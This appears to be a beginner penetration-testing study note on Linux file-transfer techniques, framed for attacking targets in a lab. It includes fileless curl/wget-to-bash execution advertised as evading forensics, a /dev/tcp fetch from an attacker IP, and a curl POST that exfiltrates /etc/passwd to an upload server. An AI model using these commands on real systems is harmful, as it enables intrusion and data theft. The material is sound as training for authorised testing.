---
tags: [module/file-transfers, linux, bash, wget, curl, scp, file-transfer, level/beginner]
---

# Linux File Transfer Methods - Beginner's Guide

## Why Linux File Transfers Matter

Linux is everywhere - servers, cloud instances, IoT devices, and even some desktops. Understanding how to move files to and from Linux systems is essential for:

- Uploading privilege escalation scripts
- Downloading exploit code
- Exfiltrating sensitive data
- Deploying persistence

**The Rule:** Linux has MANY built-in tools for file transfers. Learn them all.

---

## Real-World Example: Incident Response

During an incident response engagement, we found threat actors on 6 out of 9 web servers.

**What they did:**
1. Found SQL injection vulnerability
2. Used a Bash script to download malware
3. Script tried THREE methods:
   - First: curl
   - Second: wget
   - Third: Python

**The Lesson:** Attackers use multiple methods. You need to know them all to defend OR attack.

---

## Download vs Upload

| Operation | Direction | Example |
|-----------|-----------|---------|
| Download | Target pulls file from you | Getting LinEnum.sh onto victim |
| Upload | Target pushes file to you | Exfiltrating /etc/passwd |

---

## Method 1: Base64 Encoding

When network transfers are blocked, use text-only channels.

### Step 1: Encode on Your Machine

md5sum id_rsa
cat id_rsa | base64 -w 0; echo

Copy the long base64 string.

### Step 2: Decode on Target

echo -n "BASE64-STRING-HERE" | base64 -d > id_rsa

### Step 3: Verify

md5sum id_rsa

The hash should match what you saw on your machine.

### Limitations

- Not practical for large files
- Can be tedious with long strings
- Works when no network is available

---

## Method 2: wget Downloads

### Basic wget

wget https://example.com/file.sh -O /tmp/file.sh

### wget with Output Directory

wget -P /tmp/ https://example.com/file.sh

### wget Quiet Mode (No Output)

wget -q https://example.com/file.sh -O /tmp/file.sh

### wget Resume (If Interrupted)

wget -c https://example.com/largefile.iso -O /tmp/largefile.iso

---

## Method 3: curl Downloads

### Basic curl

curl -o /tmp/file.sh https://example.com/file.sh

### curl Follow Redirects

curl -L -o /tmp/file.sh https://example.com/file.sh

### curl with Headers

curl -H "User-Agent: Mozilla/5.0" -o /tmp/file.sh https://example.com/file.sh

### curl Save as Same Name

curl -O https://example.com/file.sh

---

## Method 4: Fileless Execution (No Disk)

Instead of downloading a file to disk, execute it directly in memory.

### curl to bash

curl https://example.com/script.sh | bash

### wget to bash

wget -qO- https://example.com/script.sh | bash

### curl to python

curl https://example.com/script.py | python3

### curl to sh

curl https://example.com/script.sh | sh

**The Advantage:** Leaves no file on disk - harder for forensics.

---

## Method 5: Bash /dev/tcp

If wget and curl aren't available, Bash can do raw TCP connections.

### Step 1: Open Connection

exec 3<>/dev/tcp/10.10.14.5/80

### Step 2: Send HTTP GET Request

echo -e "GET /file.sh HTTP/1.1\n\n" >&3

### Step 3: Read Response

cat <&3

This prints the HTTP response including the file content.

**Note:** Requires Bash compiled with --enable-net-redirections (default in most distros).

---

## Method 6: SCP (SSH File Transfer)

SCP uses SSH for secure file transfer.

### On Your Machine (Server)

# Start SSH server
sudo systemctl enable ssh
sudo systemctl start ssh

# Check if running
netstat -lnpt | grep :22

### Download from Target to Your Machine

scp user@target:/path/to/file /local/path/

### Upload to Target from Your Machine

scp /local/file user@target:/remote/path/

### Recursive Directory Copy

scp -r user@target:/remote/dir /local/dir/

---

## Upload Operations

### Web Upload with uploadserver

On Your Machine (Server):

# Install uploadserver
pip3 install uploadserver

# Create HTTPS certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start server with HTTPS
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

On Target:

curl -X POST https://YOUR-IP/upload -F 'files=@/etc/passwd' --insecure

### Python Web Server (Download from Target)

On Target (if you have Python):

# Python3
python3 -m http.server 8000

# Python2.7
python2.7 -m SimpleHTTPServer 8000

On Your Machine:

wget http://target:8000/file.txt

### PHP Web Server

On Target:

php -S 0.0.0.0:8000

On Your Machine:

wget http://target:8000/file.txt

### Ruby Web Server

On Target:

ruby -run -ehttpd . -p8000

On Your Machine:

wget http://target:8000/file.txt

---

## SCP Upload

If SSH outbound is allowed:

scp /local/file user@target:/remote/path/

---

## Method Comparison

| Method | Best For | Stealth | Speed |
|--------|----------|---------|-------|
| Base64 | Text-only channels | High | Slow |
| wget/curl | General use | Medium | Fast |
| Fileless | Avoiding disk writes | High | Fast |
| /dev/tcp | When tools missing | Medium | Slow |
| SCP | Secure transfers | Low | Fast |
| Python server | Quick webserver | Medium | Fast |

---

## Key Takeaways

- Linux has MANY built-in file transfer methods
- wget and curl are the most common - learn them well
- Base64 works when network is restricted
- Fileless execution leaves no traces
- /dev/tcp works even when wget/curl are missing
- SCP is secure but needs SSH access
- Python can quickly start a web server
- Threat actors use multiple methods - so should you
- Always test what's available on the target
- Document what works for future reference
- Practice ALL these methods in the lab
